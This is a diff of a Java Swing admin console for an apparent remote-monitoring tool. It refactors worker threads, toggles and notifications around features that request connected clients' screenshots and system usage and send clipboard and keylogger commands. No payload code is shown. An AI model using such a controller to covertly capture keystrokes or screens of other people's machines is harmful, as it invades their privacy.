@@ -2,7 +2,8 @@ package swing;
 
 import admin.Admin;
 import models.SystemInfoModel;
-import swing.ContextMenu.test;
+import models.Worker;
+import swing.ContextMenu.ContextMenu;
 import swing.button.ButtonCustom;
 import swing.notification.Notification;
 import swing.progressbar.ProgressBarCustom;
@@ -13,13 +14,17 @@ import utils.console;
 
 import javax.swing.*;
 import javax.swing.border.EmptyBorder;
+import javax.swing.event.ChangeEvent;
+import javax.swing.event.ChangeListener;
 import javax.swing.event.ListSelectionEvent;
 import javax.swing.event.ListSelectionListener;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.util.concurrent.ThreadPoolExecutor;
+import java.awt.event.ItemEvent;
+import java.awt.event.ItemListener;
+import java.util.HashMap;
 
 import static utils.Command.*;
 
@@ -59,60 +64,75 @@ public class index extends JFrame {
     private JPanel right_right_bottom;
     private JPanel right_right_middle;
     private JScrollPane jsp_txtarea_log;
-    private ToggleButton toggle_screen;
-    private ToggleButton toggle_monitor;
+    private JCheckBox toggle_monitor;
+    private JCheckBox toggle_usage;
     private JPanel monitor;
     private JPanel usage;
     private JPanel right_left_top;
-    private ToggleButton toggle_usage;
 
-    private static Admin admin;
     private String currentClientId;
+    private static Admin admin;
+    private static Notification notification;
+    private static HashMap<String, Worker> workers = new HashMap<>();
     private static DefaultTableModel defaultTableModel = new DefaultTableModel();
+
+    private static final String DISCONNECT_MESSAGE_TEMPLATE = "Client [%s] has disconnected!";
     private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
-    private static Notification panel;
-    private static Thread a;
-    private static Thread b;
-    private static Thread c;
+    private static final String FETCH_WORKER = "fetch_worker";
+    private static final String MONITOR_WORKER = "monitor_worker";
+    private static final String SYSTEM_USAGE_WORKER = "system_usage_worker";
+    private static final Integer INDEX_WIDTH = 1200;
+    private static final Integer INDEX_HEIGHT = 800;
+    private static final Integer NOTIFICATION_SLEEP = 5000;
+
     public index() {
         initComponent();
         (admin = new Admin(this)).start();
-        (a = new Thread(this::fetch)).start();
-        (b = new Thread(this::screen)).start();
-        (c = new Thread(this::monitoring)).start();
+        workers.put(FETCH_WORKER, new Worker(this::fetchTable));
+        workers.put(MONITOR_WORKER, new Worker(this::fetchClientMonitor));
+        workers.put(SYSTEM_USAGE_WORKER, new Worker(this::fetchClientSystemUsage));
+
+        workers.get(FETCH_WORKER).start();
+        workers.get(MONITOR_WORKER).start();
+        workers.get(SYSTEM_USAGE_WORKER).start();
     }
 
     private void initComponent() {
         /**
          * Frame config
          */
-        this.setSize(1200, 800);
+        this.setSize(INDEX_WIDTH, INDEX_HEIGHT);
         this.setResizable(true);
         this.setContentPane(main);
         this.setLocationRelativeTo(null);
-        this.setTitle("Monitoring system");
         this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         /**
-         * Panel config
+         * Component config
          */
         this.main.setBackground(Color.WHITE);
         this.left.setBackground(Color.WHITE);
+        this.usage.setBackground(Color.WHITE);
         this.right.setBackground(Color.WHITE);
+        this.monitor.setBackground(Color.WHITE);
         this.right_left.setBackground(Color.WHITE);
         this.right_right.setBackground(Color.WHITE);
-        this.right_left_middle.setBackground(Color.WHITE);
         this.right_left_top.setBackground(Color.WHITE);
-        this.monitor.setBackground(Color.WHITE);
-        this.usage.setBackground(Color.WHITE);
         this.right_right_top.setBackground(Color.WHITE);
+        this.right_left_middle.setBackground(Color.WHITE);
         this.right_left_bottom.setBackground(Color.WHITE);
         this.right_right_middle.setBackground(Color.WHITE);
         this.right_right_bottom.setBackground(Color.WHITE);
+        EmptyBorder emptyBorder = new EmptyBorder(0, 0, 0, 0);
+        this.txt_ip.setBorder(emptyBorder);
+        this.txt_cpu.setBorder(emptyBorder);
+        this.txt_ram.setBorder(emptyBorder);
+        this.txt_disk.setBorder(emptyBorder);
+        this.txt_uuid.setBorder(emptyBorder);
         /**
          * Table config
          */
-        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
         defaultTableModel.setColumnIdentifiers(tableHeaders);
+        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
         this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
             public void valueChanged(ListSelectionEvent e) {
                 int selectedRow = table.getSelectedRow();
@@ -126,12 +146,12 @@ public class index extends JFrame {
                 txt_disk.setText(client.getDisk());
                 txt_cpu.setText(client.getCpu());
                 txt_ip.setText(client.getIp());
-
-                console.info("[CURRENT CLIENT] " + currentClientId);
             }
         });
+        this.table.setModel(defaultTableModel);
+        TableCustom.apply(jsp_table, TableCustom.TableType.MULTI_LINE);
         /**
-         * ActionListener config
+         * Listener config
          */
         this.btn_clipboard.addActionListener(new ActionListener() {
             @Override
@@ -147,70 +167,52 @@ public class index extends JFrame {
                 admin.onHandle(COMMAND_KEYLOGGER);
             }
         });
-
-        test.addDefaultContextMenu(txtarea_log);
-        panel = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER, "Client has disconnect!");
-
-        txt_uuid.setBorder(new EmptyBorder(0,0,0,0));
-        txt_cpu.setBorder(new EmptyBorder(0,0,0,0));
-        txt_ram.setBorder(new EmptyBorder(0,0,0,0));
-        txt_disk.setBorder(new EmptyBorder(0,0,0,0));
-        txt_ip.setBorder(new EmptyBorder(0,0,0,0));
-
-        btn_keylog = new ButtonCustom();
-        btn_keylog.setStyle(ButtonCustom.ButtonStyle.PRIMARY);
-        btn_keylog.setText("Keylog");
-
-        this.toggle_usage.setSelected(true);
-        this.toggle_usage.addEventToggleSelected(new ToggleAdapter() {
-            @Override
-            public void onSelected(boolean selected) {
-                console.error("toggle_monitor");
-                if (selected) {
-                    c.resume();
+        this.toggle_usage.addItemListener(new ItemListener() {
+            public void itemStateChanged(ItemEvent e) {
+                if (toggle_usage.isSelected()) {
+                    workers.get(SYSTEM_USAGE_WORKER).resume();
+                    workers.get(SYSTEM_USAGE_WORKER).setStatus(true);
+                    right_right_middle.setBackground(Color.WHITE);
+                    return;
                 }
-                c.suspend();
+                right_right_middle.setBackground(new Color(240,240,240));
+                pgb_cpu.setBackground(new Color(240,240,240));
+                pgb_disk.setBackground(new Color(240,240,240));
+                pgb_ram.setBackground(new Color(240,240,240));
+                fetchClientSystemUsage(0, 0, 0);
+                workers.get(SYSTEM_USAGE_WORKER).suspend();
+                workers.get(SYSTEM_USAGE_WORKER).setStatus(false);
+                notification.showNotification("System usage stream stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
             }
         });
-
-        this.toggle_monitor.setSelected(true);
-        this.toggle_monitor.addEventToggleSelected(new ToggleAdapter() {
-            @Override
-            public void onSelected(boolean selected) {
-                console.error("toggle_screen");
-                if (selected) {
-                    b.resume();
+        this.toggle_monitor.addItemListener(new ItemListener() {
+            public void itemStateChanged(ItemEvent e) {
+                if (toggle_monitor.isSelected()) {
+                    lbl_client_monitor.setIcon(new ImageIcon(getClass().getResource("loading.gif")));
+                    right_left_middle.setBackground(Color.WHITE);
+                    lbl_client_monitor.setText(null);
+                    workers.get(MONITOR_WORKER).resume();
+                    workers.get(MONITOR_WORKER).setStatus(true);
+                    return;
                 }
-                b.suspend();
+                lbl_client_monitor.setIcon(null);
+                lbl_client_monitor.setText("OFF");
+                right_left_middle.setBackground(new Color(240,240,240));
+                workers.get(MONITOR_WORKER).suspend();
+                workers.get(MONITOR_WORKER).setStatus(false);
+                notification.showNotification("Monitor stream stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
             }
         });
-
-        table.setModel(defaultTableModel);
-        TableCustom.apply(jsp_table, TableCustom.TableType.MULTI_LINE);
+        /**
+         * External config
+         */
+        ContextMenu.addDefaultContextMenu(txtarea_log);
+        notification = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER);
     }
 
-    public void sync() {
-        panel.setMessageText(String.format("Client [%s] has disconnected!", currentClientId.substring(0, currentClientId.length()/2)));
-        int rowCount = defaultTableModel.getRowCount();
-        for (int i = rowCount - 1; i >= 0; i--) {
-            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
-        }
-        currentClientId = null;
-        panel.showNotification();
-        txt_uuid.setText(null);
-        txt_cpu.setText(null);
-        txt_ram.setText(null);
-        txt_disk.setText(null);
-        txt_ip.setText(null);
-        pgb_cpu.setValue(0);
-        pgb_ram.setValue(0);
-        pgb_disk.setValue(0);
-        txtarea_log.setText(null);
-    }
-
-    public void fetch() {
+    public void fetchTable() {
         while (true) {
-            console.warn("GUI FETCHING...");
+            console.log("[FETCH] Fetch table");
             try {
                 (defaultTableModel = new DefaultTableModel()).setColumnIdentifiers(tableHeaders);
                 admin.getClients().forEach((key, value) -> {
@@ -229,10 +231,10 @@ public class index extends JFrame {
         }
     }
 
-    public void screen() {
+    public void fetchClientMonitor() {
         while (true) {
-            console.warn("SCREEN FETCHING...");
             try {
+                console.log("[FETCH] Client monitor");
                 if (currentClientId != null) {
                     admin.onHandle(COMMAND_CLIENT_SCREEN);
                 }
@@ -244,15 +246,9 @@ public class index extends JFrame {
         }
     }
 
-    public void updateClientScreen(ImageIcon imageIcon) {
-        lbl_client_monitor.setText(null);
-        lbl_client_monitor.setBorder(null);
-        lbl_client_monitor.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(400, 300, Image.SCALE_SMOOTH)));
-    }
-
-    public void monitoring() {
+    public void fetchClientSystemUsage() {
         while (true) {
-            console.warn("MONITORING FETCHING...");
+            console.log("[FETCH] Client system usage");
             try {
                 if (currentClientId != null) {
                     admin.onHandle(COMMAND_MONITORING);
@@ -265,7 +261,15 @@ public class index extends JFrame {
         }
     }
 
-    public void updateProgressBar(int cpu, int ram, int disk) {
+    public void fetchClientMonitor(ImageIcon imageIcon) {
+        if(!workers.get(MONITOR_WORKER).getStatus()) return;
+        lbl_client_monitor.setText(null);
+        lbl_client_monitor.setBorder(null);
+        lbl_client_monitor.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(400, 300, Image.SCALE_SMOOTH)));
+    }
+
+    public void fetchClientSystemUsage(int cpu, int ram, int disk) {
+        if(!workers.get(SYSTEM_USAGE_WORKER).getStatus()) return;
         this.pgb_cpu.setValue(cpu);
         this.pgb_ram.setValue(ram);
         this.pgb_disk.setValue(disk);
@@ -273,6 +277,23 @@ public class index extends JFrame {
 
     public void appendLog(String message) {
         txtarea_log.append(message + "\n");
+    }
+
+    public void sync() {
+        notification.showNotification(String.format(DISCONNECT_MESSAGE_TEMPLATE, currentClientId.substring(0, currentClientId.length() / 2)), NOTIFICATION_SLEEP, Notification.Type.INFO);
+        for (int i = defaultTableModel.getRowCount() - 1; i >= 0; i--) {
+            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
+        }
+        currentClientId = null;
+        txt_uuid.setText(null);
+        txt_cpu.setText(null);
+        txt_ram.setText(null);
+        txt_disk.setText(null);
+        txt_ip.setText(null);
+        pgb_cpu.setValue(0);
+        pgb_ram.setValue(0);
+        pgb_disk.setValue(0);
+        txtarea_log.setText(null);
     }
 
     public String getCurrentClientId() {
